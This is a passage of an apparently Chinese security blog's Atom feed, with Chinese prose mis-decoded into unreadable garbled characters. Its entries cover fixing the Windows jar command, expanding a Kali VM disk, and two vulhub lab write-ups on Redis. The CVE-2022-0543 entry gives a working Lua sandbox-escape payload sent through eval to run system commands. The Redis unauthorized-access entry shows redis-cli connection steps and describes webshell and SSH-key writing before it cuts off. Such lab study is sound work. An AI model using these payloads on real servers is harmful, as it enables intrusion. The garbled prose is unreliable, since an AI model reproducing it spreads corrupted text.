ä¸Šè¿°å˜é‡å€¼</p><p>å¦‚æœâ€å˜é‡å+å˜é‡å€¼â€œçš„æ ·å­ï¼ˆå°±åƒä¸Šé¢çš„é…ç½®å›¾å·®ä¸å¤šï¼‰ï¼Œæ‰ç”¨;è¿æ¥ï¼ˆâ€œ%JAVA_HOME%\bin;JAVA_HOME%\jre\binâ€ï¼‰</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0d63d1cc8ee295263419c0718e809542.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¥ä¸‹æ¥æ˜¯é‡ç‚¹äº†ï¼š</p><p>ç”Ÿæˆ â€œjreâ€ æ–‡ä»¶å¤¹å’Œå…¶å†…å®¹ã€‚<br>è¿›å…¥åˆ°å®‰è£…ç›®å½•ä¸‹(C:\Program Files\Java\jdk-11.0.9)ï¼Œåœ¨æ­¤å¤„è¿è¡Œcmdï¼Œå†è¾“å…¥ï¼šâ€œbin\jlink.exe --module-path jmods --add-modules java.desktop --output jreâ€<br>è¿™æ—¶å€™æ¥ç€ç›´æ¥è¾“å…¥ â€œjarâ€ çš„è¯ï¼Œè¿˜æ˜¯ä¼šæœ‰é”™è¯¯ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b5371d495aabde202119568ba3c8b47a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç›´æ¥å…³æ‰ï¼Œé‡æ–°å¼€ä¸€ä¸ªcmdå°±è¡Œäº†ï¼Œç›´æ¥æŒ‰ â€œå¼€å§‹é”®â€ + â€œR&quot;ï¼Œè¾“å…¥ï¼šâ€œcmdâ€ã€‚è¿™æ—¶å€™å†è¯•è¯•ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/64d1016243b22e94e1a0b1aa07f73f15.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™æ ·å°±æ˜¯æˆåŠŸäº†ï¼Œç„¶åå°±èƒ½ä½¿ç”¨jaräº†ã€‚</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/sinat_20593627/article/details/109613547">win10è§£å†³â€˜jarâ€™ä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åº çš„é—®é¢˜_jarâ€™ ä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤,ä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åº æˆ–æ‰¹å¤„ç†æ–‡ä»¶ã€‚-CSDNåšå®¢</a></p></blockquote>]]></content>
    
    
    <summary type="html">ğŸ¥§è§£å†³win10ä½¿ç”¨jarå‘½ä»¤å‡ºç°â€jarä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤â€çš„é—®é¢˜ï¼›windows10ä¸‹è½½äº†javaä½†æ˜¯æ— æ³•ä½¿ç”¨jarå‘½ä»¤çš„é—®é¢˜åŸå› å’Œé—®é¢˜è§£å†³</summary>
    
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>kaliæ‰©å±•ç¡¬ç›˜ï¼Œä»¥åŠå¯¼è‡´å¼€æœºå»¶è¿Ÿé—®é¢˜ï¼Œä¸€ç›´å¡åœ¨ç™»å½•ç•Œé¢çš„é—®é¢˜è§£å†³</title>
    <link href="https://blog.m3x1.cn/posts/3b44ba93.html"/>
    <id>https://blog.m3x1.cn/posts/3b44ba93.html</id>
    <published>2025-03-25T16:00:00.000Z</published>
    <updated>2025-03-26T15:03:28.600Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="æ‰©å±•ç¡¬ç›˜">æ‰©å±•ç¡¬ç›˜</h2><p>ä»Šå¤©æˆ‘å› ä¸ºçœ‹åˆ°åŸæ¥çš„kaliè™šæ‹Ÿæœºåªæœ‰20gå†…å­˜ï¼Œå°±æƒ³æ‰©å±•ä¸€ä¸‹</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101617857-2116683396.png" alt="image-20220829233729344"></p><p>ç‚¹å¼€ä¸Šé¢è¿™ä¸ªç¡¬ç›˜è¿™ä¸€æ </p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101618295-1284516527.png" alt="image-20220829233757522"></p><p>ç‚¹å¼€ä¹‹åç‚¹å‡»æ‰©å±•ï¼Œç„¶åé€‰æ‹©è‡ªå·±æƒ³è¦æ‰©å±•çš„ç©ºé—´ï¼Œè¿™é‡Œæ ¹æ®è‡ªå·±æƒ…å†µè‡ªå·±å†³å®š</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101618752-1960261044.png" alt="image-20220829233824985"></p><p>åœ¨ä¸Šè¿°æ‰©å±•ç£ç›˜å®¹é‡ä¹‹åï¼Œå¹¶ä¸ä¼šç›´æ¥æŠŠå®¹é‡æ‰©å±•åˆ°ç³»ç»Ÿç›˜é‡Œï¼Œè¿˜éœ€è¦æˆ‘ä»¬è‡ªå·±å»åˆ†é…ã€‚</p><p>å³ä¸Šè§’æœç´¢Gpartedï¼Œkaliæœ‰ä¸€ä¸ªè‡ªå¸¦çš„åˆ†é…ç£ç›˜ç©ºé—´çš„å·¥å…·</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101619237-528678126.png" alt="image-20220830090014908"></p><p>æœ¬æ¥æ˜¯è¿™æ ·ä¸€ä¸ªç•Œé¢</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101619573-866531015.png" alt="image-20220830090052673"></p><p>ç„¶åå³é”®ç‚¹å‡»åœç”¨äº¤æ¢ç©ºé—´ï¼Œç„¶åæŠŠä¸­é—´è¿™ä¸¤ä¸ªåˆ†åŒºåˆ é™¤ï¼Œåªå‰©ä¸‹sda1é‚£ä¸ªåˆ†åŒºï¼Œå› ä¸ºå¦‚æœå­˜åœ¨ä¸­é—´è¿™ä¸¤ä¸ªåˆ†åŒºï¼Œå°±ä¸èƒ½æŠŠæ‰©å±•çš„ç£ç›˜ç©ºé—´åˆ†é…ç»™ç³»ç»Ÿç›˜äº†ã€‚</p><p>ä¸­é—´çš„åŒºåŸŸåˆ é™¤ä¹‹åï¼Œå°±ä¼šåªå‰©ä¸‹ä¸€ä¸ªsda1é‚£ä¸ªåˆ†åŒºï¼Œç„¶åå°±å¯ä»¥å¼€å§‹è°ƒæ•´å¤§å°äº†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101619970-1314137064.png" alt="image-20220830090331897"></p><p>ç„¶åä¸‹é¢è¿™ä¸ªåœ°æ–¹å°±ä¼šå˜åŒ–ï¼Œå˜æˆä½ ä¹‹å‰æ‰©å±•çš„ç©ºé—´å®¹é‡</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101620377-953480513.png" alt="image-20220830090502454"></p><p>ç„¶åä½ è‡ªè¡Œè¿›è¡Œåˆ†é…å³å¯ï¼Œä¸è¿‡è¿™é‡Œæ³¨æ„è¦ç•™å‡ºä¸€äº›ç©ºé—´ç»™äº¤æ¢åŒºåŸŸï¼Œå› ä¸ºæˆ‘ä»¬åé¢è¿˜æ˜¯è¦é‡æ–°å»ºå›åŸæ¥çš„é‚£ä¸ªswapåˆ†åŒº</p><p>å¦‚æœä½ ç•™æœ‰ä¸€éƒ¨åˆ†ç©ºé—´çš„è¯ï¼Œåº”è¯¥æ˜¯å¯ä»¥ç‚¹å‡»æ–°å»ºåˆ†åŒºçš„</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101620763-1046461728.png" alt="image-20220830090933936"></p><p>æ–°å»ºçš„åˆ†åŒºæ–‡ä»¶ç³»ç»Ÿè¦å’ŒåŸæ¥ä¸€æ ·ï¼ŒåŸæ¥æ˜¯extendedçš„ï¼Œæ–°å»ºçš„åˆ†åŒºä¹Ÿè¦æ˜¯extendedçš„ï¼Œç„¶åé‚£ä¸ªswapåˆ†åŒºä¹Ÿè¦åœ¨è¿™ä¸ªextendedåˆ†åŒºä¹‹ä¸‹å»å»ºç«‹ã€‚ç„¶åå®Œæˆåå¼€æœºå‘ç°å˜å¾—å¾ˆæ…¢ã€‚</p><h2 id="å¼€æœºå»¶è¿Ÿé—®é¢˜è§£å†³">å¼€æœºå»¶è¿Ÿé—®é¢˜è§£å†³</h2><p>å› ä¸ºæœ‰ä¸€ä¸ªå…³äºuuidçš„ä¿¡æ¯æˆ‘ä»¬è¿˜æ²¡æœ‰ä¿®æ”¹ã€‚</p><p>åœ¨linuxä¸­ï¼Œuuidæ˜¯é€šç”¨å”¯ä¸€è¯†åˆ«ç ã€‚uuidæ˜¯ä¸€ä¸ªè½¯ä»¶å»ºæ„çš„æ ‡å‡†ï¼Œç›®çš„å°±æ˜¯è®©åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„æ‰€ç”¨å…ƒç´ éƒ½èƒ½æœ‰å”¯ä¸€çš„è¾¨è¯†èµ„è®¯ï¼Œä»è€Œä¸éœ€è¦é€è¿‡ä¸­å¤®æ§åˆ¶ç«¯æ¥åšè¯†åˆ«èµ„è®¯çš„æŒ‡å®š</p><p>å¤§æ¦‚æ„æ€å°±æ˜¯ä¸€ä¸ªè¯†åˆ«ç ï¼Œå¦‚æœä½ æ²¡æœ‰è¿›è¡Œé‡æ–°ä¿®æ”¹çš„è¯ï¼Œä½ å¼€æœºçš„æ—¶å€™è¿˜æ˜¯ä¼šå»å¯»æ‰¾åŸæ¥çš„uuidï¼Œå› ä¸ºæˆ‘ä»¬è¿™é‡Œå·²ç»åˆ é™¤é‡å»ºè¿‡äº†åˆ†åŒºï¼Œæ‰€ä»¥å®ƒçš„uuidç ä¹Ÿå‘ç”Ÿäº†å˜åŒ–</p><p>é€šè¿‡ä¸‹é¢è¿™ä¸ªå‘½ä»¤å¯ä»¥æŸ¥çœ‹uuidç </p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo blkid</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101621219-13902332.png" alt="image-20220830091830957"></p><p>ç„¶åæˆ‘ä»¬éœ€è¦ä¿®æ”¹ä¸¤ä¸ªæ–‡ä»¶çš„uuidç </p><p>åˆ†åˆ«æ˜¯/etc/fstabå’Œ/etc/initramfs-tools/conf.d/resume</p><p>æˆ‘ä»¬å¯ä»¥ç”¨vimæ‰“å¼€ï¼Œå¦‚æœä½ æœ‰å…¶å®ƒç¼–è¾‘å™¨ï¼Œä¹Ÿå¯ä»¥ç”¨å…¶å®ƒç¼–è¾‘å™¨</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/fstab</span><br><span class="line">sudo vim /etc/initramfs-tools/conf.d/resume</span><br></pre></td></tr></table></figure><p>å¯èƒ½ä¼šå‡ºç°ä¸‹é¢çš„ç•Œé¢ï¼Œç›´æ¥æŒ‰Eå¼€å§‹ç¼–è¾‘å°±å¯ä»¥</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101621646-272993183.png" alt="image-20220830092204947"></p><p>æ¥ä¸‹å»å°±æ˜¯vimçš„ä¸€ä¸ªç¼–è¾‘ç•Œé¢</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101622029-954380503.png" alt="image-20220830092232770"></p><p>éœ€è¦æŠŠä¸Šé¢çš„ä¸¤ä¸ªuuidåˆ†åˆ«æ”¹æˆå¯¹åº”çš„uuidï¼Œå› ä¸ºç³»ç»Ÿç›˜æ²¡å˜ï¼Œæ‰€ä»¥è¿™ä¸ªext4çš„uuidä¸€èˆ¬æ˜¯ä¸éœ€è¦æ”¹å˜çš„ï¼Œä¸€èˆ¬è¦æ”¹çš„å°±æ˜¯ä¸‹é¢çš„è¿™ä¸ªswapçš„uuidã€‚æ”¹å®Œä¿å­˜åé‡å¯å³å¯ã€‚</p>]]></content>
    
    
    <summary type="html">ğŸ¥§kaliæ‰©å±•ç¡¬ç›˜ï¼Œä»¥åŠå¯¼è‡´å¼€æœºå»¶è¿Ÿé—®é¢˜ï¼Œä¸€ç›´å¡åœ¨ç™»å½•ç•Œé¢çš„é—®é¢˜è§£å†³ï¼›vmè™šæ‹Ÿæœºkaliæ‰©å±•ç¡¬ç›˜æ•™ç¨‹ï¼›kaliæ‰©å±•ç¡¬ç›˜åçš„å¼€æœºæ…¢é—®é¢˜è§£å†³æ–¹æ³•</summary>
    
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ã€vulhubæ¼æ´é¶åœºã€‘redisæ¼æ´ï¼ˆæ²™ç›’é€ƒé€¸ï¼‰CVE-2022-0543åŠæ¼æ´å¤ç°</title>
    <link href="https://blog.m3x1.cn/posts/50ac647a.html"/>
    <id>https://blog.m3x1.cn/posts/50ac647a.html</id>
    <published>2025-03-25T16:00:00.000Z</published>
    <updated>2025-03-26T15:03:28.615Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="æ¼æ´è¯¦æƒ…">æ¼æ´è¯¦æƒ…</h2><h3 id="å—å½±å“çš„ç³»ç»Ÿ">å—å½±å“çš„ç³»ç»Ÿ</h3><ul><li><strong>ä»…é™äº Debian ç³» Linux å‘è¡Œç‰ˆ</strong>ï¼ˆå¦‚ Debianã€Ubuntuï¼‰åŠå…¶è¡ç”Ÿç‰ˆæœ¬ã€‚</li><li><strong>ä¸å—å½±å“çš„ç³»ç»Ÿ</strong>ï¼šCentOSã€RHEL ç­‰é Debian ç³»å‘è¡Œç‰ˆä¸å—æ­¤æ¼æ´å½±å“ï¼ˆæ¼æ´æºäº Debian ç»´æŠ¤è€…åœ¨æ‰“åŒ… Redis æ—¶çš„è¡¥ä¸é—®é¢˜ï¼Œè€Œé Redis è‡ªèº«ä»£ç é—®é¢˜ï¼‰ã€‚</li></ul><h3 id="å—å½±å“çš„-Redis-ç‰ˆæœ¬èŒƒå›´">å—å½±å“çš„ Redis ç‰ˆæœ¬èŒƒå›´</h3><ul><li>redisç‰ˆæœ¬å°äºç­‰äº6.xçš„éƒ½å¯ä»¥å°è¯•ã€‚</li></ul><h3 id="è§¦å‘æ¡ä»¶">è§¦å‘æ¡ä»¶</h3><p>æ”»å‡»è€…éœ€å…·å¤‡ Redis çš„æœªæˆæƒè®¿é—®æƒé™æˆ–åˆæ³•å‡­è¯ã€‚</p><h2 id="æ¼æ´åŸç†">æ¼æ´åŸç†</h2><h3 id="èƒŒæ™¯">èƒŒæ™¯</h3><p>Redis å…è®¸é€šè¿‡ <code>eval</code> å‘½ä»¤æ‰§è¡Œ Lua è„šæœ¬ï¼Œä½†æ­£å¸¸æƒ…å†µä¸‹è¿™äº›è„šæœ¬è¿è¡Œåœ¨æ²™ç®±ä¸­ï¼Œæ— æ³•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–æ–‡ä»¶æ“ä½œã€‚</p><h3 id="è¡¥ä¸å¼•å…¥çš„æ¼æ´">è¡¥ä¸å¼•å…¥çš„æ¼æ´</h3><p>Debian/Ubuntu åœ¨æ‰“åŒ… Redis æ—¶ï¼Œé€šè¿‡è¡¥ä¸ä»£ç å‘ Lua æ²™ç®±ä¸­æ³¨å…¥äº†ä¸€ä¸ªåä¸º <code>package</code> çš„å…¨å±€å¯¹è±¡ã€‚è¯¥å¯¹è±¡æœ¬åº”åœ¨æºç ä¸­è¢«æ³¨é‡Šï¼ˆå‡ºäºæ²™ç®±å®‰å…¨è€ƒè™‘ï¼‰ï¼Œä½†è¡¥ä¸é”™è¯¯åœ°é‡æ–°å¯ç”¨äº†å®ƒã€‚</p><h3 id="æ²™ç›’é€ƒé€¸è¿‡ç¨‹">æ²™ç›’é€ƒé€¸è¿‡ç¨‹</h3><ul><li><strong>åŠ è½½åŠ¨æ€åº“</strong>ï¼šæ”»å‡»è€…å¯é€šè¿‡ <code>package.loadlib</code> åŠ è½½ Lua ç³»ç»Ÿåº“ï¼ˆå¦‚ <code>liblua5.1.so.0</code>ï¼‰ï¼Œè°ƒç”¨å…¶å¯¼å‡ºå‡½æ•°ï¼ˆå¦‚ <code>luaopen_io</code>ï¼‰è·å– <code>io</code> åº“æƒé™ã€‚</li><li><strong>æ‰§è¡Œå‘½ä»¤</strong>ï¼šåˆ©ç”¨ <code>io.popen</code> ç­‰å‡½æ•°æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚</li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> io_l = <span class="built_in">package</span>.<span class="built_in">loadlib</span>(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="string">&quot;luaopen_io&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">io</span> = io_l();</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;r&quot;</span>);  <span class="comment">-- æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line"><span class="keyword">local</span> res = f:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>);</span><br><span class="line">f:<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure><h2 id="æ”»å‡»æ€è·¯">æ”»å‡»æ€è·¯</h2><p>å•ä»æ”»å‡»è§’åº¦è€Œè¨€ï¼Œå¯ä»¥ä½¿ç”¨redisæœªæˆæƒç›¸åŒçš„æ‰“æ³•ï¼Œåšå®¢è§ï¼š<a href="https://www.cnblogs.com/MrSoap/p/18737580">ã€vulhubã€‘redis 4-unacc ï¼ˆredisæœªæˆæƒè®¿é—®ï¼‰ - Mr_Soap - åšå®¢å›­</a></p><p>ä»æ¼æ´è§’åº¦æ¥çœ‹ï¼Œä½¿ç”¨<code>eval</code>å‡½æ•°æ‰§è¡Œä¸Šé¢çš„é€ƒé€¸è¿‡ç¨‹å³å¯ã€‚</p><h2 id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</h2><blockquote><p>kalié¶æœºï¼š192.168.192.132</p><p>kaliæ”»å‡»æœºï¼š192.168.192.135</p></blockquote><p>é¶æœºè¿›å…¥vulhub-master/redis/CVE-2022-0543ä¸­ï¼Œä½¿ç”¨dockerå¯åŠ¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326161957788.png" alt="image-20250326161957788"></p><p>æ”»å‡»æœºè¿›è¡Œredisæœªæˆæƒè¿æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.192.132</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326162311984.png" alt="image-20250326162311984"></p><p>è¿›è¡Œgetshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;);local io = io_l();local f = io.popen(&quot;whoami&quot;, &quot;r&quot;);local res = f:read(&quot;*a&quot;);f:close();return res;&#x27; 0</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326162631517.png" alt="image-20250326162631517"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326162822769.png" alt="image-20250326162822769"></p><p>è¯´æ˜å·²ç»èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ã€‚</p>]]></content>
    
    
    <summary type="html">ğŸ¥§ã€vulhubæ¼æ´é¶åœºã€‘redisæ¼æ´ï¼ˆæ²™ç›’é€ƒé€¸ï¼‰CVE-2022-0543æ¼æ´åŸç†åŠæ¼æ´å¤ç°ï¼›redisæ¼æ´ï¼ˆæ²™ç›’é€ƒé€¸ï¼‰CVE-2022-0543æ¼æ´è¯¦æƒ…</summary>
    
    
    
    <category term="webæ¸—é€" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ã€vulhubæ¼æ´é¶åœºã€‘redisæ¼æ´åŠredisæ¼æ´å¤ç°</title>
    <link href="https://blog.m3x1.cn/posts/2ab81980.html"/>
    <id>https://blog.m3x1.cn/posts/2ab81980.html</id>
    <published>2025-03-24T16:00:00.000Z</published>
    <updated>2025-03-25T04:41:39.422Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="æ¼æ´è¯¦æƒ…">æ¼æ´è¯¦æƒ…</h2><blockquote><p>å½±å“ç‰ˆæœ¬ Redis 2.xï¼Œ3.xï¼Œ4.xï¼Œ5.x</p></blockquote><p>Redisé»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨0.0.0.0:6379(åœ¨redis3.2ä¹‹åï¼Œrediså¢åŠ äº†protected-modeï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œéç»‘å®šIPæˆ–è€…æ²¡æœ‰é…ç½®å¯†ç è®¿é—®æ—¶éƒ½ä¼šæŠ¥é”™)ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç­‰ï¼Œè¿™æ ·å°†ä¼šå°†RedisæœåŠ¡æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯(é»˜è®¤ä¸ºç©º)çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—®Redisä»¥åŠè¯»å–Redisçš„æ•°æ®ã€‚</p><p>æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—®Redisçš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨Redisè‡ªèº«çš„æä¾›çš„configå‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…è¿˜å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„/root/.sshæ–‡ä»¶çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡å™¨ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</p><p>æ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹:</p><p>(1) Redisç»‘å®šåœ¨0.0.0.0:6379,ä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘</p><p>(2) æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆé»˜è®¤ä¸ºç©ºï¼‰æˆ–è€…å¼±å¯†ç ï¼Œå¯ä»¥å…å¯†ç ç™»å½•redisæœåŠ¡</p><h2 id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</h2><blockquote><p>kalié¶æœºï¼š 192.168.192.132</p><p>kaliæ”»å‡»æœºï¼š192.168.192.135</p></blockquote><h4 id="é¶æœºè®¾ç½®">é¶æœºè®¾ç½®</h4><p>è¿›å…¥vulhubé¶åœºçš„redis/4-unaccç›®å½•ï¼Œè¾“å…¥å‘½ä»¤ï¼Œç„¶åç­‰å¾…åŠ è½½å®Œæ¯•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325085647378.png" alt="image-20250325085647378"></p><blockquote><p>å°æç¤ºï¼šå¦‚æœä¸æˆåŠŸï¼Œå¯èƒ½æ˜¯æ²¡æœ‰æŒ‚ä»£ç†ï¼ˆæ‡‚å§ï¼Ÿï¼‰</p></blockquote><p>è¾“å…¥å‘½ä»¤æŸ¥çœ‹ç«¯å£æ˜¯6379</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325085748429.png" alt="image-20250325085748429"></p><p>æˆ‘ä»¬ç”¨nmapæ‰«ä¸€ä¸‹é¶æœºï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°6379ç«¯å£æ‰“å¼€äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.192.132 -p 1-65535</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325090133919.png" alt="image-20250325090133919"></p><p>æµè§ˆå™¨è®¿é—®çœ‹çœ‹ï¼Œèƒ½æ‰“å¼€å°±è¡Œ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325090518098.png" alt="image-20250325090518098"></p><h4 id="æ”»å‡»æœºè®¾ç½®">æ”»å‡»æœºè®¾ç½®</h4><p>å®‰è£…redis-cliè¿œç¨‹è¿æ¥å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br></pre></td></tr></table></figure><p>ç„¶åè§£å‹ï¼Œè¿›å…¥è¯¥ç›®å½•è¿›è¡Œç¼–è¯‘ï¼Œç­‰å¾…å®Œæˆã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd redis-stable</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325091518998.png" alt="image-20250325091518998"></p><p>å‡ºç°å¦‚ä¸Šç•Œé¢å°±è¯´æ˜æˆåŠŸäº†</p><h4 id="æ¼æ´åˆ©ç”¨æµç¨‹">æ¼æ´åˆ©ç”¨æµç¨‹</h4><h5 id="å†™å…¥webshell">å†™å…¥webshell</h5><ol><li>ç›®æ ‡å¼€å¯äº†webæœåŠ¡å™¨,å¹¶ä¸”çŸ¥é“webè·¯å¾„(å¯ä»¥åˆ©ç”¨phpinfoæˆ–è€…é”™è¯¯æš´è·¯å¾„ç­‰)</li><li>éœ€è¦å…·æœ‰è¯»å†™å¢åˆ æ”¹æŸ¥æƒ</li></ol><p>ç”¨redis-cliå‘½ä»¤è¿œç¨‹å…å¯†ç™»å½•redisä¸»æœº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># æ— å¯†ç ç™»å½•å‘½ä»¤</span><br><span class="line">redis-cli -h ç›®æ ‡ä¸»æœºIP</span><br><span class="line"># æœ‰å¯†ç ç™»å½•å‘½ä»¤</span><br><span class="line">redis-cli -h ç›®æ ‡ä¸»æœºIP -p ç«¯å£6379 -a ç™»å½•å¯†ç </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325091905278.png" alt="image-20250325091905278"></p><p>è¿™æ 